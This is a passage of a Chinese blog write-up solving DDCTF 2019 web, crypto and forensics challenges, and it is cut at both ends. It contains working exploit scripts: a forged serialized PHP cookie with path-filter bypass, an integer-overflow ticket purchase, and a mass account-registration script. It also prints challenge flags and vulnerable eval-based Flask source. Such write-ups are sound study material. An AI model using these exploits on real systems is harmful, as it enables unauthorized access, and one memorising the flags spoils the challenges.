class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">$data = sprintf($data,$v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入 nickname 为 <code>%s</code> 格式化字符串得到 eancrykey</p><p>eancrykey: <code>EzblrbNS</code></p><p>利用 Application 的析构函数 __destruct() 读 flag 文件，根据提示 <code>//eancrykey  and flag under the folder</code>，flag 应在 <code>../config/flag.txt</code></p><p>序列化 Application 定义 <code>var $path = &#39;..././config/flag.txt&#39;;</code> 双写 ../ 绕过 sanitizepath 函数过滤得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"Application"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">21</span>:<span class="string">"..././config/flag.txt"</span>;&#125;</span><br></pre></td></tr></table></figure><p>伪造 ddctf_id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> md5(<span class="string">'EzblrbNS'</span>.<span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</span><br><span class="line"><span class="number">5</span>a014dbe49334e6dbb7326046950bee2</span><br></pre></td></tr></table></figure><p>getflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">header = &#123;<span class="string">'didictf_username'</span>:<span class="string">'admin'</span>&#125;</span><br><span class="line"><span class="comment">#cookies = &#123;'ddctf_id':'a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e4b66689ce408335068bd8b5a7c6bd92%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22219.218.130.178%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A82%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10.13%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D13f4f1b110d5b22d052004531ac44816'&#125;</span></span><br><span class="line">cookies = &#123;<span class="string">'ddctf_id'</span>:<span class="string">'O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2'</span>&#125;</span><br><span class="line">data = &#123;<span class="string">'nickname'</span>:<span class="string">'%s'</span>&#125;</span><br><span class="line">res = s.post(<span class="string">'http://117.51.158.44/app/Session.php'</span>,headers=header,cookies=cookies,data=data)</span><br><span class="line"><span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure><p>flag</p><p><code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p><hr><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>上传 jpg 图片显示 <code>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</code></p><p>推测要二次渲染绕过</p><p>使用 <a href="https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738" target="_blank" rel="noopener">https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738</a> 这个 php 脚本生成含 phpinfo() 的 jpg</p><p>这题要多试几次，先上传， 再下载，脚本处理后再上传、下载</p><p>如此反复多次得到 flag</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ddctf2019.assets/5cb187f2298d7.png" alt></p><hr><p>##大吉大利,今晚吃鸡~</p><p>抓包分析发现传入 ticket_price 可控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1</span><br><span class="line">Host: 117.51.147.155:5050</span><br><span class="line">Accept: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">Referer: http://117.51.147.155:5050/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: user_name=1q123; REVEL_SESSION=3dff7d284606b58024a5a3ca60ad6906</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>利用 unsigned int 整数溢出，能买到一张入场券</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ddctf2019.assets/5cb31665886cf.png" alt></p><p>进入游戏发现需要知道其他账号的 id 和 ticket 才能移除对手</p><p>写脚本不断注册、买入场券，获取其 id 和 ticket，然后用自己的号将其移除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">ids = []</span><br><span class="line">tickets = []</span><br><span class="line"></span><br><span class="line">m_cookie = &#123;<span class="string">'user_name'</span>:<span class="string">'admin300'</span>,<span class="string">'REVEL_SESSION'</span>:<span class="string">'f59f3d9307f44dd5f6cb2ba44d45544d'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">s = requests.Session()</span><br><span class="line">username = <span class="string">"adminnnnsssss"</span>+str(i)</span><br><span class="line">url  = <span class="string">'http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=qqqqqqqq'</span>.format(username)</span><br><span class="line">b_url = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line"><span class="keyword">print</span> (url)</span><br><span class="line">c = s.get(url).cookies</span><br><span class="line">cookie = &#123;<span class="string">'user_name'</span>:username,<span class="string">'REVEL_SESSION'</span>:c[<span class="string">'REVEL_SESSION'</span>]&#125;</span><br><span class="line">br = s.get(b_url,cookies=cookie)</span><br><span class="line">buy_json = br.text</span><br><span class="line">tic = re.findall(<span class="string">r'"bill_id":"(.*?)"'</span>,buy_json)[<span class="number">0</span>]</span><br><span class="line">pay_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id='</span>+tic</span><br><span class="line">pay_res = s.get(pay_url,cookies=cookie)</span><br><span class="line">res_url = <span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span></span><br><span class="line">res = s.get(res_url,cookies=cookie)</span><br><span class="line">iid =  re.findall(<span class="string">r'"id":(.*?),"ticket":".*?"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">ticket =  re.findall(<span class="string">r'"id":.*?,"ticket":"(.*?)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">ids.append(iid)</span><br><span class="line">tickets.append(ticket)</span><br><span class="line"><span class="keyword">print</span> iid </span><br><span class="line"><span class="keyword">print</span> ticket</span><br><span class="line">re_url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'</span>.format(iid,ticket)</span><br><span class="line">sss = requests.get(re_url,cookies=m_cookie).text</span><br><span class="line"><span class="keyword">print</span> sss</span><br></pre></td></tr></table></figure><p>吃鸡</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ddctf2019.assets/5cb31612c7e6e.png" alt></p><hr><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark 导出 HTTP 对象</p><p>发现到处的文件中有两张图和一个解密网站 html</p><p>导出 png 图片，其中一张高度改 800 得到 key: xS8niJM7</p><p><a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a>解密</p><p>得到隐藏信息：</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ddctf2019.assets/5cb09f797c2cc.png" alt></p><p>转16进制得到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D | xxd -r -p</span><br><span class="line">DDCTF&#123;NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2&#125;⏎</span><br></pre></td></tr></table></figure><hr><h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>有关 Shamir’s Secret Sharing</p><p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing</a></p><p>参考这篇文章的代码，<a href="http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/</a></p><p>先把第一组的1，2，4解出，再把第二组的3，4，5解出，最后利用得到的两个数据解出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line"></span><br><span class="line">pairs1 = []</span><br><span class="line">pairs1 += [(<span class="number">1</span>, <span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>)]</span><br><span class="line">pairs1 += [(<span class="number">2</span>, <span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>)]</span><br><span class="line">pairs1 += [(<span class="number">4</span>, <span class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>)]</span><br><span class="line"></span><br><span class="line">pairs2 = []</span><br><span class="line">pairs2 += [(<span class="number">3</span>, <span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>)]</span><br><span class="line">pairs2 += [(<span class="number">4</span>, <span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>)]</span><br><span class="line">pairs2 += [(<span class="number">5</span>, <span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>)]</span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sss</span><span class="params">(p,pairs,res)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">        x, y = pair</span><br><span class="line">        top = <span class="number">1</span></span><br><span class="line">        bottom = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">            <span class="keyword">if</span> j == i:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xj, yj = pair</span><br><span class="line">            top = (top * (-xj)) % p</span><br><span class="line">            bottom = (bottom * (x - xj)) % p</span><br><span class="line">        res += (y * top * invmod(bottom, p)) % p</span><br><span class="line">        res %= p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p31 = (<span class="number">1</span>,sss(p,pairs1,res))</span><br><span class="line">p32 = (<span class="number">2</span>,sss(p,pairs2,res))</span><br><span class="line"></span><br><span class="line">pairs3 = [p31,p32]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(sss(p,pairs3,res))</span><br></pre></td></tr></table></figure><p>运行脚本得到 flag</p><p><code>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</code></p><hr><h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>下载保存后使用 xortool </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xortool -x xx.txt -o</span><br><span class="line">cat ./* | grep DD</span><br></pre></td></tr></table></figure><p>flag</p><p><code>DDCTF{b5f49e210662301ac0f6f3a6526106f1}</code></p><hr><h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>图片最低位提取 7SsQWmZ524i/yVWoMeAIJA==</p><p>aes 解密</p><p><a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptaes</a></p><p>密钥是 ：weigongcun</p><p>DDCTF{Q*2!x@B0}</p><hr><h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">session[<span class="string">'log'</span>].append(event)</span><br><span class="line"><span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line"><span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">haystack = haystack[:haystack.find(postfix)]</span><br><span class="line"><span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">resp = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line"><span class="keyword">except</span> RollBackException:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line"><span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line"><span class="keyword">else</span>: resp += ret_val</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">session.modified = <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">querystring = urllib.unquote(request.query_string)</span><br><span class="line">request.event_queue = []</span><br><span class="line"><span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">'log'</span>] = []</span><br><span class="line">request.prev_session = dict(session)</span><br><span class="line">trigger_event(querystring)</span><br><span class="line"><span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">page = args[<span class="number">0</span>]</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line">html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line"><span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line"><span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">html += line</span><br><span class="line">source.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line"><span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> 